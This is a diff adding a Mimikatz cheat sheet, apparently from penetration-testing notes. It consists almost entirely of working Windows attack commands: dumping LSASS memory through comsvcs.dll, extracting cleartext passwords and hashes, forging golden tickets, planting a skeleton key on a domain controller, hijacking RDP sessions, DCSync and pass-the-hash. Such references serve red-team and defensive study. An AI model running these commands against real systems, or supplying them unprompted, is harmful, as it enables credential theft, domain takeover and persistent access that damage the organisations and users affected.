@@ -1,0 +1,106 @@
+# Mimikatz
+## Dumps passwords, hashes, pins & kerberos tickets from memory in Windows
+## https://github.com/gentilkiwi/mimikatz
+
+# output all clear text passwords stored on computer (requires wdigest on)
+sekurlsa::logonpasswords full
+sekurlsa::wdigest
+
+# Minidump - Extract LSASS process memory for passwords using rundll32
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
+
+## Load minidump in mimikatz & output passwords
+sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords
+
+
+# Create golden ticket
+kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
+
+# Create skeleton key
+privilege::debug
+misc::skeleton
+
+## map the share
+net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
+## login as someone
+rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
+
+# Take over RDP session
+## patch RDP service to allow more than two users
+ts::multirdp 
+
+## Run TSCON.exe as SYSTEM
+privilege::debug 
+token::elevate 
+ts::remote /id:2 
+
+## get session ID you want to hijack
+query user
+create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+net start sesshijack
+
+
+# list/export certificates
+CRYPTO::Certificates
+
+# create golden/silver/trust tickets
+KERBEROS::Golden 
+
+# list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.
+KERBEROS::List 
+
+# pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
+KERBEROS::PTT 
+
+# ask a DC to synchronize an object (get password data for account). No need to run code on DC.
+LSADUMP::DCSync 
+
+# Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”
+LSADUMP::LSA 
+
+# get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
+LSADUMP::SAM 
+
+# Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
+LSADUMP::Trust 
+
+# Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
+MISC::AddSid 
+
+# Inject a malicious Windows SSP to log locally authenticated credentials.
+MISC::MemSSP 
+
+# Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.
+MISC::Skeleton 
+
+# get debug rights (this or Local System rights is required for many Mimikatz commands).
+PRIVILEGE::Debug 
+
+# list Kerberos encryption keys
+SEKURLSA::Ekeys 
+
+# List Kerberos credentials for all authenticated users (including services and computer account)
+SEKURLSA::Kerberos 
+
+# get Domain Kerberos service account (KRBTGT)password data
+SEKURLSA::Krbtgt 
+
+# lists all available provider credentials. This usually shows recently logged on user and computer credentials.
+SEKURLSA::LogonPasswords 
+
+# Pass- theHash and Over-Pass-the-Hash
+SEKURLSA::Pth 
+
+# Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
+SEKURLSA::Tickets 
+
+# list all tokens of the system
+TOKEN::List 
+
+# impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
+TOKEN::Elevate 
+
+# impersonate a token with Domain Admin credentials.
+TOKEN::Elevate /domainadmin 
+
